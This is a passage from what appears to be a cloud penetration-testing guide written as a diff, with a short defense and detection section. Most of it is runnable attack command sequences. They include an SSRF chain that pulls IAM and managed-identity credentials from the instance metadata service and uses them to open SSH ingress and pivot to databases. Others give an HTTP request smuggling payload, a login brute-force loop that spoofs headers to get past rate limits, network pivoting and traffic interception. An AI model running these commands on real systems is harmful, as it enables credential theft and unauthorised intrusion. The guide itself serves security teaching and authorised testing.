+# Example: Image proxy service
+curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/"
+
+# Step 2: Extract instance IAM role credentials
+curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+# Returns role name: "WebServerRole"
+
+curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole"
+# Returns:
+# {
+#   "AccessKeyId": "ASIA...",
+#   "SecretAccessKey": "...",
+#   "Token": "...",
+#   "Expiration": "..."
+# }
+
+# Step 3: Configure AWS CLI with stolen credentials
+aws configure set aws_access_key_id ASIA...
+aws configure set aws_secret_access_key ...
+aws configure set aws_session_token ...
+
+# Step 4: Enumerate permissions
+aws sts get-caller-identity
+aws iam list-attached-role-policies --role-name WebServerRole
+
+# Step 5: Discover network configuration
+aws ec2 describe-instances --instance-ids $(curl -s http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/instance-id)
+
+# Step 6: Identify overly permissive security group
+aws ec2 describe-security-groups --group-ids sg-xxxxx
+
+# Step 7: Modify security group (if role has permission)
+aws ec2 authorize-security-group-ingress \
+  --group-id sg-xxxxx \
+  --protocol tcp \
+  --port 22 \
+  --cidr <your_ip>/32
+
+# Step 8: Extract SSH key from user-data (if present)
+curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/user-data" | grep -i "BEGIN.*PRIVATE KEY"
+
+# Step 9: SSH into instance
+ssh -i extracted-key.pem ec2-user@<instance_public_ip>
+
+# Step 10: Pivot to internal resources
+# Access RDS database (no password if within VPC)
+mysql -h production-db.xxxxx.us-east-1.rds.amazonaws.com -u admin
+
+# Access ElastiCache (Redis)
+redis-cli -h production-cache.xxxxx.cache.amazonaws.com
+
+# Access internal ELB
+curl http://internal-elb-xxxxx.us-east-1.elb.amazonaws.com/admin
+```
+
+**Azure Metadata Service Exploitation:**
+
+```bash
+# Azure SSRF to metadata
+curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
+  -H "Metadata: true"
+
+# Extract managed identity token
+curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+  -H "Metadata: true"
+
+# Use token for Azure API calls
+ACCESS_TOKEN="<extracted_token>"
+curl -H "Authorization: Bearer $ACCESS_TOKEN" \
+  "https://management.azure.com/subscriptions?api-version=2020-01-01"
+
+# Modify NSG rules
+curl -X PUT \
+  -H "Authorization: Bearer $ACCESS_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"properties": {"securityRules": [...]}}' \
+  "https://management.azure.com/subscriptions/<sub_id>/resourceGroups/<rg>/providers/Microsoft.Network/networkSecurityGroups/<nsg_name>?api-version=2021-03-01"
+```
+
+---
+
+## Defense and Detection Mechanisms
+
+### Network Monitoring and Logging
+
+**AWS VPC Flow Logs Analysis:**
+
+```bash
+# Query CloudWatch Logs for rejected connections
+aws logs filter-log-events \
+  --log-group-name /aws/vpc/flowlogs \
+  --start-time $(($(date +%s) - 3600))000 \
+  --filter-pattern '[version, account, eni, source, destination, srcport, destport, protocol, packets, bytes, start, end, action=REJECT, status]' \
+  --query 'events[*].message' \
+  --output text
+
+# Identify port scanning activity (many REJECT from same source)
+aws logs filter-log-events \
+  --log-group-name /aws/vpc/flowlogs \
+  --filter-pattern '[version, account, eni, source="<attacker_ip>", destination, srcport, destport, protocol, packets, bytes, start, end, action=REJECT, status]' \
+  | jq -r '.events[].message' \
+  | awk '{print $6}' \
+  | sort | uniq -c | sort -nr
+
+# Detect data exfiltration (large byte counts)
+aws logs filter-log-events \
+  --log-group-name /aws/vpc/flowlogs \
+  --filter-pattern '[version, account, eni, source, destination, srcport, destport, protocol, packets, bytes>1000000, start, end, action, status]'
+```
+
+**[Inference] Indicators of Compromise in Flow Logs:**
+
+- High number of REJECT actions from single source (scanning)
+- Connections to unusual ports (4444, 5555, 8080 for C2)
+- Asymmetric traffic patterns (high egress, low ingress = exfiltration)
+- Connections to metadata service from unexpected sources
+- Traffic on uncommon protocols (GRE, ICMP tunneling)
+
+**Azure Network Watcher:**
+
+```bash
+# Enable NSG flow logs
+az network watcher flow-log create \
+  --resource-group <rg_name> \
+  --nsg <nsg_name> \
+  --storage-account <storage_account> \
+  --enabled true \
+  --retention 90 \
+  --format JSON \
+  --log-version 2
+
+# Query flow logs for anomalies
+az network watcher flow-log show \
+  --resource-group <rg_name> \
+  --name <flow_log_name>
+
+# Analyze with Log Analytics
+# KQL query for scanning detection:
+AzureNetworkAnalytics_CL
+| where FlowDirection_s == "I" and FlowStatus_s == "D"
+| summarize Count=count() by SrcIP_s, bin(TimeGenerated, 1m)
+| where Count > 100
+```
+
+**GCP VPC Flow Logs:**
+
+```bash
+# Query for denied connections
+gcloud logging read "resource.type=gce_subnetwork AND jsonPayload.reporter=DEST AND jsonPayload.disposition=DENIED" \
+  --limit 100 \
+  --format json \
+  | jq -r '.[] | "\(.timestamp) \(.jsonPayload.connection.src_ip):\(.jsonPayload.connection.src_port) -> \(.jsonPayload.connection.dest_ip):\(.jsonPayload.connection.dest_port)"'
+
+# Detect tunneling protocols
+gcloud logging read "resource.type=gce_subnetwork AND (jsonPayload.connection.protocol=47 OR jsonPayload.connection.protocol=50)" \
+  --format json
+
+# Monitor for unusual data transfer
+gcloud logging read "resource.type=gce_subnetwork AND jsonPayload.bytes_sent>10000000" \
+  --limit 50
+```
+
+### Recommended Security Controls
+
+**Network Segmentation Best Practices:**
+
+- **[Unverified]** Implement zero-trust network architecture
+- Use private subnets for all non-public resources
+- Restrict security group rules to minimum required access
+- Implement Network ACLs as additional layer (defense in depth)
+- Use AWS PrivateLink/Azure Private Link/GCP Private Service Connect instead of public endpoints
+
+**VPN Security Hardening:**
+
+- Use IKEv2 instead of IKEv1
+- Implement strong cryptographic algorithms (AES-256, SHA-256, DH Group 14+)
+- Enable Perfect Forward Secrecy (PFS)
+- Implement certificate-based authentication instead of PSK where possible
+- Use MFA for Client VPN access
+- Regularly rotate VPN credentials and certificates
+- Monitor VPN connection logs for anomalies
+
+**Important Subtopics for Further Study:**
+
+- **Cloud-Native Network Security Tools**: AWS Network Firewall, Azure Firewall, GCP Cloud Armor
+- **Service Mesh Security**: Istio, Linkerd for micro-segmentation
+- **Cloud WAF Bypass Techniques**: Exploiting CDN/WAF misconfigurations
+- **Container Network Exploitation**: Kubernetes network policies, CNI vulnerabilities
+- **Serverless Network Security**: Lambda/Functions VPC integration attacks
+- **Transit Gateway Exploitation**: AWS Transit Gateway, Azure Virtual WAN attack vectors
+
+---
+
+## Load Balancer Abuse
+
+Load balancers in cloud environments distribute traffic across multiple backend instances and present unique attack vectors due to their privileged network position and configuration complexities.
+
+### Attack Surface Analysis
+
+Cloud load balancers (AWS ELB/ALB/NLB, Azure Load Balancer, GCP Load Balancing) expose several vulnerabilities:
+
+**Header Manipulation**: Load balancers often add or modify HTTP headers revealing internal infrastructure. Target headers include `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Host`, and cloud-specific headers like `X-Amzn-Trace-Id`.
+
+```bash
+# Enumerate headers passed through load balancer
+curl -v https://target.example.com -H "X-Forwarded-For: 127.0.0.1" -H "X-Original-URL: /admin"
+
+# Test for SSRF through forwarded headers
+curl https://target.example.com -H "X-Forwarded-Host: evil.attacker.com"
+```
+
+**Direct Backend Access**: Misconfigurations may allow direct connection to backend instances bypassing load balancer security controls.
+
+```bash
+# Discover backend IPs through DNS enumeration
+dig target.example.com +short
+nslookup target.example.com
+
+# Attempt direct backend connection
+nmap -sV -p 80,443,8080 backend-ip-address
+
+# Test with specific Host header to bypass virtual hosting
+curl http://backend-ip -H "Host: target.example.com"
+```
+
+### HTTP Request Smuggling
+
+Load balancers and backend servers may parse HTTP requests differently, enabling request smuggling attacks.
+
+```bash
+# CL.TE (Content-Length vs Transfer-Encoding) attack
+# Create malicious request file
+cat > smuggle.txt << 'EOF'
+POST / HTTP/1.1
+Host: target.example.com
+Content-Length: 44
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: target.example.com
+
+EOF
+
+# Send smuggled request
+cat smuggle.txt | nc target.example.com 80
+```
+
+**Using Burp Suite Turbo Intruder**:
+
+```python
+# Turbo Intruder script for automated smuggling
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=1,
+                          requestsPerConnection=100,
+                          pipeline=False)
+    
+    attack = '''POST / HTTP/1.1
+Host: target.example.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+60
+POST /admin HTTP/1.1
+Host: target.example.com
+Content-Length: 10
+
+x=
+0
+
+'''
+    engine.queue(attack)
+```
+
+### Load Balancer Enumeration
+
+```bash
+# Identify load balancer type through response headers
+curl -I https://target.example.com | grep -i "server\|x-amz\|x-azure\|via"
+
+# AWS ELB detection
+dig target.example.com | grep -i "elb.amazonaws.com"
+
+# Azure Load Balancer detection  
+dig target.example.com | grep -i "cloudapp.azure.com"
+
+# GCP Load Balancer detection
+dig target.example.com | grep -i "googleusercontent.com"
+```
+
+### Session Persistence Exploitation
+
+Load balancers use session persistence (sticky sessions) mechanisms that can be abused.
+
+```bash
+# Cookie-based persistence exploitation
+# Modify load balancer cookies to target specific backends
+curl https://target.example.com -b "AWSALB=specific-backend-identifier"
+
+# Source IP persistence bypass using X-Forwarded-For
+curl https://target.example.com -H "X-Forwarded-For: target-ip-address"
+```
+
+### Health Check Endpoint Abuse
+
+Load balancers perform health checks on backend instances, often exposing sensitive endpoints.
+
+```bash
+# Common health check paths
+curl https://target.example.com/health
+curl https://target.example.com/healthcheck
+curl https://target.example.com/status
+curl https://target.example.com/ping
+curl https://target.example.com/_health
+curl https://target.example.com/api/health
+
+# Fuzz for health endpoints
+ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.example.com/FUZZ -mc 200
+```
+
+### TLS/SSL Downgrade Attacks
+
+[Inference] Load balancers may support legacy protocols for compatibility, potentially enabling downgrade attacks.
+
+```bash
+# Test SSL/TLS versions
+nmap --script ssl-enum-ciphers -p 443 target.example.com
+
+# Test for SSLv3/TLS1.0 support
+sslscan target.example.com
+
+# Detailed cipher analysis
+testssl.sh --vulnerable target.example.com
+```
+
+### Rate Limiting Bypass
+
+Distributed load balancers may implement per-backend rate limiting rather than global limits.
+
+```bash
+# Force distribution across multiple backends
+for i in {1..100}; do
+    curl -X POST https://target.example.com/api/login \
+    -H "X-Forwarded-For: 10.0.$((RANDOM % 255)).$((RANDOM % 255))" \
+    -d "username=admin&password=test$i" &
+done
+```
+
+## DNS Zone Transfer
+
+DNS zone transfers (AXFR) expose complete DNS records for a domain, revealing internal infrastructure mapping.
+
+### Zone Transfer Fundamentals
+
+Zone transfers replicate DNS records between authoritative nameservers. Misconfigured servers may allow unauthorized transfers exposing:
+
+- Internal hostnames and IP addresses
+- Mail server configurations
+- Subdomain enumeration
+- Network architecture mapping
+
+### Manual Zone Transfer Testing
+
+```bash
+# Identify authoritative nameservers
+dig target.example.com NS +short
+host -t NS target.example.com
+
+# Attempt zone transfer against each nameserver
+dig @ns1.target.example.com target.example.com AXFR
+dig @ns2.target.example.com target.example.com AXFR
+
+# Alternative using host command
+host -l target.example.com ns1.target.example.com
+host -t axfr target.example.com ns1.target.example.com
+```
+
+### Automated Zone Transfer Enumeration
+
+```bash
+# DNSRecon - comprehensive DNS enumeration
+dnsrecon -d target.example.com -t axfr
+dnsrecon -d target.example.com -a  # Attempt zone transfer against all nameservers
+
+# Fierce - DNS reconnaissance tool
+fierce --domain target.example.com --dns-servers ns1.target.example.com
+
+# Nmap NSE scripts
+nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=target.example.com -p 53 ns1.target.example.com
+```
+
+### Cloud-Specific DNS Enumeration
+
+**AWS Route53**:
+
+```bash
+# Route53 does not support AXFR, but enumerate through API if credentials available
+aws route53 list-hosted-zones
+aws route53 list-resource-record-sets --hosted-zone-id Z1234567890ABC
+
+# Enumerate CloudFront distributions
+dig target.example.com | grep cloudfront.net
+```
+
+**Azure DNS**:
+
+```bash
+# Azure DNS does not support AXFR by default
+# Use Azure CLI for enumeration with valid credentials
+az network dns zone list
+az network dns record-set list --zone-name target.example.com --resource-group rg-name
+```
+
+**GCP Cloud DNS**:
+
+```bash
+# Cloud DNS does not support AXFR
+# API-based enumeration with credentials
+gcloud dns managed-zones list
+gcloud dns record-sets list --zone=zone-name
+```
+
+### Subdomain Enumeration Alternatives
+
+When zone transfers fail, alternative subdomain discovery methods:
+
+```bash
+# Certificate transparency logs
+curl -s "https://crt.sh/?q=%25.target.example.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# Amass - comprehensive subdomain enumeration
+amass enum -d target.example.com -o subdomains.txt
+amass enum -passive -d target.example.com  # Passive mode only
+
+# Subfinder - fast passive subdomain discovery
+subfinder -d target.example.com -o subdomains.txt
+
+# Assetfinder - find domains and subdomains
+assetfinder --subs-only target.example.com
+
+# DNSdumpster API query
+curl -s "https://api.hackertarget.com/hostsearch/?q=target.example.com"
+```
+
+### DNS Cache Snooping
+
+Query nameserver cache to identify recently resolved domains.
+
+```bash
+# Check if specific domain is cached (non-recursive query)
+dig @nameserver-ip target.example.com +norecurse
+
+# Automated cache snooping with wordlist
+while read domain; do
+    dig @nameserver-ip "$domain.target.example.com" +norecurse +short
+done < /usr/share/wordlists/subdomains-top1million-5000.txt
+```
+
+### DNS Reconnaissance Wordlists
+
+```bash
+# SecLists subdomain wordlists
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+/usr/share/seclists/Discovery/DNS/fierce-hostlist.txt
+
+# Cloud-specific subdomain patterns
+cat > cloud-subdomains.txt << 'EOF'
+s3
+cdn
+api
+admin
+dev
+staging
+test
+prod
+vpn
+mail
+smtp
+ftp
+db
+database
+backup
+jenkins
+gitlab
+jira
+confluence
+monitoring
+grafana
+prometheus
+kibana
+elastic
+EOF
+```
+
+### DNSSEC Analysis
+
+[Inference] DNSSEC misconfigurations may reveal additional infrastructure details.
+
+```bash
+# Check DNSSEC status
+dig target.example.com +dnssec
+
+# Verify DNSSEC chain
+dig target.example.com +dnssec +multi
+
+# Delve - DNSSEC debugging tool
+delv @8.8.8.8 target.example.com +rtrace
+```
+
+## Transit Gateway Exploitation
+
+Transit gateways enable inter-VPC and hybrid cloud connectivity, creating potential pivot points in cloud networks.
+
+### Transit Gateway Architecture
+
+**AWS Transit Gateway**: Centralized hub connecting VPCs, VPN connections, and Direct Connect gateways. **Azure Virtual WAN**: Hub-and-spoke network architecture. **GCP VPC Network Peering**: Direct connectivity between VPC networks.
+
+### Reconnaissance Phase
+
+```bash
+# AWS Transit Gateway enumeration (requires credentials)
+aws ec2 describe-transit-gateways
+aws ec2 describe-transit-gateway-attachments
+aws ec2 describe-transit-gateway-route-tables
+aws ec2 search-transit-gateway-routes --transit-gateway-route-table-id tgw-rtb-xxxxx --filters "Name=state,Values=active"
+
+# Azure Virtual WAN reconnaissance
+az network vwan list
+az network vhub list
+az network vhub connection list --vhub-name hub-name --resource-group rg-name
+
+# GCP VPC peering discovery
+gcloud compute networks peerings list
+gcloud compute networks describe vpc-name
+```
+
+### Route Table Analysis
+
+Transit gateway route tables define traffic flow between connected networks.
+
+```bash
+# AWS route propagation analysis
+aws ec2 get-transit-gateway-route-table-propagations --transit-gateway-route-table-id tgw-rtb-xxxxx
+
+# Export and analyze routes
+aws ec2 search-transit-gateway-routes \
+    --transit-gateway-route-table-id tgw-rtb-xxxxx \
+    --filters "Name=state,Values=active" \
+    --query 'Routes[*].[DestinationCidrBlock,State,Type]' \
+    --output table
+
+# Identify routing to sensitive networks
+aws ec2 search-transit-gateway-routes \
+    --transit-gateway-route-table-id tgw-rtb-xxxxx \
+    --filters "Name=destination-cidr-block,Values=10.0.0.0/8"
+```
+
+### Network Pivoting Through Transit Gateway
+
+Once access to a connected network is established:
+
+```bash
+# Map reachable networks from compromised instance
+ip route show
+route -n
+
+# Identify transit gateway CIDR ranges
+# AWS Transit Gateway uses 169.254.0.0/16 for VPN tunnels
+ip route | grep 169.254
+
+# Scan connected VPCs through transit gateway
+nmap -sn 10.1.0.0/16  # Replace with discovered CIDR
+nmap -sV -T4 -p- discovered-target-ip
+
+# Use proxychains for pivoting
+# Configure proxychains.conf with SOCKS proxy on compromised host
+proxychains nmap -sT -Pn target-in-connected-vpc
+```
+
+### Lateral Movement Techniques
+
+```bash
+# SSH tunneling through transit gateway-connected instances
+ssh -D 8080 user@compromised-instance-in-vpc1
+# Access resources in connected VPC2 through SOCKS proxy
+
+# Port forwarding to access internal services
+ssh -L 3389:internal-server-vpc2:3389 user@compromised-instance-vpc1
+
+# VPN tunnel establishment
+# If transit gateway has VPN attachment, attempt to establish connection
+strongswan  # IPSec VPN client
+openvpn  # OpenVPN client
+```
+
+### Security Group and Network ACL Bypass
+
+Transit gateway attachments may bypass traditional VPC security controls.
+
+```bash
+# Identify security group rules on compromised instance
+aws ec2 describe-security-groups --group-ids sg-xxxxx
+
+# Check for overly permissive transit gateway routes
+# Look for 0.0.0.0/0 or broad CIDR ranges in route tables
+
+# Test connectivity to restricted resources
+nc -zv internal-restricted-host 22
+nc -zv internal-restricted-host 3389
+nc -zv internal-restricted-host 1433
+```
+
+### Traffic Interception
+
+[Inference] Positioning a compromised instance at a transit gateway junction may enable traffic inspection.
+
+```bash
+# Enable IP forwarding on compromised Linux instance
+sysctl -w net.ipv4.ip_forward=1
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Configure iptables for traffic capture
+iptables -t nat -A PREROUTING -j LOG --log-prefix "TGW-INTERCEPT: "
+iptables -t nat -A POSTROUTING -j LOG --log-prefix "TGW-INTERCEPT: "
+
+# Capture traffic with tcpdump
+tcpdump -i eth0 -w transit-capture.pcap
+tcpdump -i eth0 -n 'not port 22'  # Exclude SSH traffic
+
+# Analyze captured traffic
+wireshark transit-capture.pcap
+tshark -r transit-capture.pcap -Y "http.request || dns"
+```
+
+### CloudWatch/Monitor Log Analysis
+
+[Inference] Transit gateway flow logs may reveal network topology and traffic patterns.
+
+```bash
+# AWS VPC Flow Logs analysis (if enabled)
+aws logs describe-log-groups --log-group-name-prefix /aws/transitgateway/
+aws logs tail /aws/transitgateway/tgw-xxxxx --follow
+
+# Filter for specific source/destination
+aws logs filter-log-events \
+    --log-group-name /aws/transitgateway/tgw-xxxxx \
+    --filter-pattern "[srcaddr=10.1.*, dstaddr=10.2.*]"
+
+# Download and analyze with grep/awk
+aws logs get-log-events --log-group-name /aws/transitgateway/tgw-xxxxx \
+    | jq -r '.events[].message' | grep "ACCEPT" | awk '{print $4, $5}' | sort -u
+```
+
+## Service Endpoint Exposure
+
+Cloud service endpoints expose internal services to networks, often with misconfigurations enabling unauthorized access.
+
+### Endpoint Types
+
+**VPC Endpoints (AWS)**: Private connectivity to AWS services without internet gateway.
+
+- Interface Endpoints: ENI-based, support many AWS services
+- Gateway Endpoints: Route table-based, S3 and DynamoDB only
+
+**Private Endpoints (Azure)**: Private IP addresses for Azure services within VNet.
+
+**Private Service Connect (GCP)**: Access services using internal IP addresses.
+
+### Endpoint Discovery
+
+```bash
+# AWS VPC endpoint enumeration
+aws ec2 describe-vpc-endpoints
+aws ec2 describe-vpc-endpoints --filters "Name=vpc-id,Values=vpc-xxxxx"
+
+# List endpoint services
+aws ec2 describe-vpc-endpoint-services
+aws ec2 describe-vpc-endpoint-service-configurations
+
+# Azure private endpoint discovery
+az network private-endpoint list
+az network private-endpoint list --resource-group rg-name
+
+# GCP Private Service Connect
+gcloud compute forwarding-rules list
+gcloud compute addresses list --filter="purpose=SHARED_LOADBALANCER_VIP"
+```
+
+### Endpoint Policy Analysis
+
+VPC endpoint policies control access to services through the endpoint.
+
+```bash
+# Retrieve endpoint policy
+aws ec2 describe-vpc-endpoints --vpc-endpoint-ids vpce-xxxxx \
+    --query 'VpcEndpoints[0].PolicyDocument' --output text | jq
+
+# Check for overly permissive policies
+# Look for Principal: "*" or Action: "*"
+
+# Test S3 access through VPC endpoint
+aws s3 ls s3://bucket-name --endpoint-url https://bucket.vpce-xxxxx.s3.region.vpce.amazonaws.com
+
+# Test with different credentials/roles
+AWS_PROFILE=limited-user aws s3 ls s3://bucket-name --endpoint-url https://vpce-xxxxx.s3.region.vpce.amazonaws.com
+```
+
+### DNS Resolution Exploitation
+
+VPC endpoints use private DNS, enabling DNS-based attacks.
+
+```bash
+# Query VPC endpoint DNS
+dig vpce-xxxxx.s3.us-east-1.vpce.amazonaws.com
+nslookup service-name.privatelink.region.amazonaws.com
+
+# Enumerate services through DNS
+dnsrecon -d vpce.amazonaws.com -t brt -D /usr/share/wordlists/services.txt
+
+# Test DNS rebinding attacks
+# Configure DNS server to return VPC endpoint IP
+dig @attacker-dns-server rebind.attacker.com
+```
+
+### Service Endpoint Metadata Exposure
+
+Some endpoints expose service metadata or configuration.
+
+```bash
+# S3 endpoint metadata
+curl http://bucket.vpce-xxxxx.s3.region.vpce.amazonaws.com
+curl -v http://bucket.s3.amazonaws.com
+
+# DynamoDB endpoint testing
+aws dynamodb list-tables --endpoint-url https://vpce-xxxxx.dynamodb.region.vpce.amazonaws.com
+
+# Secrets Manager endpoint
+aws secretsmanager list-secrets --endpoint-url https://vpce-xxxxx.secretsmanager.region.vpce.amazonaws.com
+
+# Systems Manager Parameter Store
+aws ssm describe-parameters --endpoint-url https://vpce-xxxxx.ssm.region.vpce.amazonaws.com
+```
+
+### Interface Endpoint Enumeration
+
+Interface endpoints create ENIs with private IPs in subnets.
+
+```bash
+# Enumerate ENIs associated with endpoints
+aws ec2 describe-network-interfaces \
+    --filters "Name=description,Values=VPC Endpoint Interface*" \
+    --query 'NetworkInterfaces[*].[NetworkInterfaceId,PrivateIpAddress,Description]' \
+    --output table
+
+# Scan endpoint ENI IPs
+nmap -sV -p 443,80,8080 endpoint-private-ip
+
+# Test HTTPS services on endpoint IPs
+curl -k https://endpoint-private-ip
+curl -k https://endpoint-private-ip -H "Host: service-name.region.amazonaws.com"
+```
+
+### Cross-Account Endpoint Access
+
+[Inference] VPC endpoints can be configured for cross-account access, potentially exposing services.
+
+```bash
+# Check endpoint service permissions
+aws ec2 describe-vpc-endpoint-service-permissions \
+    --service-id vpce-svc-xxxxx
+
+# Attempt cross-account endpoint creation
+aws ec2 create-vpc-endpoint \
+    --vpc-id vpc-xxxxx \
+    --service-name com.amazonaws.vpce.region.vpce-svc-xxxxx \
+    --vpc-endpoint-type Interface
+
+# Test access with different account credentials
+AWS_PROFILE=alternate-account aws s3 ls --endpoint-url https://vpce-xxxxx.s3.region.vpce.amazonaws.com
+```
+
+### PrivateLink Service Discovery
+
+AWS PrivateLink enables custom service exposure.
+
+```bash
+# Discover available PrivateLink services
+aws ec2 describe-vpc-endpoint-services \
+    --query 'ServiceNames' --output text
+
+# Filter for third-party/custom services
+aws ec2 describe-vpc-endpoint-services | grep -v "com.amazonaws"
+
+# Test custom service connectivity
+aws ec2 create-vpc-endpoint \
+    --vpc-id vpc-xxxxx \
+    --service-name com.amazonaws.vpce.region.vpce-svc-custom \
+    --vpc-endpoint-type Interface \
+    --dry-run
+```
+
+### Endpoint Security Group Analysis
+
+Interface endpoints have security groups controlling access.
+
+```bash
+# Identify security groups attached to endpoint ENIs
+aws ec2 describe-network-interfaces \
+    --network-interface-ids eni-xxxxx \
+    --query 'NetworkInterfaces[0].Groups[*].[GroupId,GroupName]' \
+    --output table
+
+# Analyze security group rules
+aws ec2 describe-security-groups --group-ids sg-xxxxx
+
+# Test access from different sources
+# From allowed CIDR
+curl -k https://endpoint-private-ip
+
+# From unauthorized CIDR (should fail)
+# Use SSH tunnel or VPN to test from different source IPs
+```
+
+### Public Endpoint Misconfiguration
+
+[Unverified] Cloud services sometimes expose endpoints publicly when private access was intended.
+
+```bash
+# Check for publicly accessible database endpoints
+nmap -sV -p 1433,3306,5432,27017 public-endpoint.region.cloud-provider.com
+
+# Test RDS endpoint access
+mysql -h database.cluster-xxxxx.region.rds.amazonaws.com -u admin -p
+
+# MongoDB public endpoints
+mongo "mongodb://public-endpoint.region.mongodb.net:27017"
+
+# Redis public endpoints (common misconfiguration)
+redis-cli -h public-endpoint.region.cache.amazonaws.com -p 6379
+```
+
+### API Gateway Endpoint Exploitation
+
+API Gateway endpoints may expose internal services.
+
+```bash
+# Enumerate API Gateway endpoints
+aws apigateway get-rest-apis
+aws apigateway get-resources --rest-api-id api-id
+
+# Test API endpoints
+curl https://api-id.execute-api.region.amazonaws.com/stage/resource
+
+# Fuzz API paths
+ffuf -w /usr/share/wordlists/api/common-api-endpoints.txt \
+    -u https://api-id.execute-api.region.amazonaws.com/stage/FUZZ
+
+# Test authorization bypass
+curl https://api-endpoint/admin -H "Authorization: Bearer token"
+curl https://api-endpoint/admin -H "X-API-Key: test"
+```
+
+---
+
+**Related Topics for Further Study**: VPC peering exploitation, cloud firewall bypass techniques, service mesh security, container network policies, cloud NAT gateway abuse, IPv6 in cloud networks, cloud IDS/IPS evasion.
+
+---
+
+# Database & Data Store Testing
+
+## RDS/Cloud SQL Exposure
+
+### AWS RDS Enumeration
+
+**Discovery & Information Gathering**
+
+```bash
+# List all RDS instances (requires valid AWS credentials)
+aws rds describe-db-instances
+
+# List RDS snapshots
+aws rds describe-db-snapshots
+
+# Get specific instance details
+aws rds describe-db-instances --db-instance-identifier <instance-name>
+
+# Check security groups attached to RDS
+aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,VpcSecurityGroups]'
+```
+
+**Public Accessibility Checks**
+
+```bash
+# Identify publicly accessible RDS instances
+aws rds describe-db-instances --query 'DBInstances[?PubliclyAccessible==`true`].[DBInstanceIdentifier,Endpoint.Address,Endpoint.Port]'
+
+# Check for instances in default VPC
+aws rds describe-db-instances --query 'DBInstances[?DBSubnetGroup.VpcId==`vpc-default`]'
+```
+
+**Security Group Analysis**
+
+```bash
+# Extract security group IDs from RDS instances
+aws rds describe-db-instances --query 'DBInstances[*].VpcSecurityGroups[*].VpcSecurityGroupId' --output text
+
+# Check security group rules for overly permissive access
+aws ec2 describe-security-groups --group-ids <sg-id> --query 'SecurityGroups[*].IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]'
+```
+
+**Connection Testing**
+
+```bash
+# MySQL/MariaDB connection
+mysql -h <rds-endpoint> -P 3306 -u <username> -p
+
+# PostgreSQL connection
+psql -h <rds-endpoint> -p 5432 -U <username> -d <database>
+
+# Test for default credentials (common in CTF)
+mysql -h <rds-endpoint> -u admin -padmin
+mysql -h <rds-endpoint> -u root -p
+psql -h <rds-endpoint> -U postgres
+```
+
+**Nmap Scanning**
+
+```bash
+# Identify database services
+nmap -p 3306,5432,1433,27017 <rds-endpoint>
+
+# Service version detection
+nmap -sV -p 3306 <rds-endpoint>
+
+# Database-specific NSE scripts
+nmap -p 3306 --script mysql-info,mysql-enum <rds-endpoint>
+nmap -p 5432 --script pgsql-brute <rds-endpoint>
+```
+
+### Google Cloud SQL
+
+**GCloud CLI Enumeration**
+
+```bash
+# List all Cloud SQL instances
+gcloud sql instances list
+
+# Get specific instance details
+gcloud sql instances describe <instance-name>
+
+# List databases in instance
+gcloud sql databases list --instance=<instance-name>
+
+# Check if instance has public IP
+gcloud sql instances describe <instance-name> --format='get(ipAddresses[0].ipAddress)'
+```
+
+**Authorized Networks Check**
+
+```bash
+# View authorized networks (IP whitelist)
+gcloud sql instances describe <instance-name> --format='get(settings.ipConfiguration.authorizedNetworks)'
+
+# Check for 0.0.0.0/0 in authorized networks (public access)
+gcloud sql instances describe <instance-name> --format='json' | jq '.settings.ipConfiguration.authorizedNetworks[] | select(.value=="0.0.0.0/0")'
+```
+
+**Connection Methods**
+
+```bash
+# Using Cloud SQL Proxy
+cloud_sql_proxy -instances=<project>:<region>:<instance>=tcp:3306
+
+# Direct connection (if public IP and authorized)
+mysql -h <public-ip> -u <user> -p
+
+# Using gcloud connection helper
+gcloud sql connect <instance-name> --user=<username>
+```
+
+### Azure SQL Database
+
+**Azure CLI Enumeration**
+
+```bash
+# List all SQL servers
+az sql server list
+
+# List databases on specific server
+az sql db list --resource-group <rg-name> --server <server-name>
+
+# Check firewall rules
+az sql server firewall-rule list --resource-group <rg-name> --server <server-name>
+
+# Identify public access rules
+az sql server firewall-rule list --resource-group <rg-name> --server <server-name> --query "[?startIpAddress=='0.0.0.0']"
+```
+
+**Connection String Exploitation**
+
+```bash
+# Standard connection format
+sqlcmd -S <server-name>.database.windows.net -d <database-name> -U <username> -P <password>
+
+# Using Python
+python3 -c "import pymssql; conn = pymssql.connect(server='<server>.database.windows.net', user='<user>', password='<pass>', database='<db>')"
+```
+
+**Common Misconfigurations**
+
+- Firewall rule allowing 0.0.0.0-255.255.255.255 (Azure portal "Allow Azure services" creates 0.0.0.0 rule)
+- SQL authentication enabled with weak passwords
+- No connection encryption enforcement
+- Auditing/threat detection disabled
+
+---
+
+## NoSQL Injection (DynamoDB, CosmosDB)
+
+### DynamoDB Injection Techniques
+
+**Query Parameter Manipulation**
+
+DynamoDB uses JSON-based query syntax that can be vulnerable when user input is improperly sanitized.
+
+```python
+# Vulnerable application code example (Python/boto3)
+import boto3
+dynamodb = boto3.resource('dynamodb')
+table = dynamodb.Table('Users')
+
+# Vulnerable: Direct string concatenation
+user_id = request.args.get('id')  # Attacker controlled
+response = table.get_item(Key={'user_id': user_id})
+
+# Exploitation payload
+# Normal: ?id=12345
+# Inject: ?id={"S":"admin"}  # Type confusion attack
+```
+
+**Condition Expression Injection**
+
+```python
+# Vulnerable filter expression
+filter_exp = f"username = :uname AND password = :pwd"
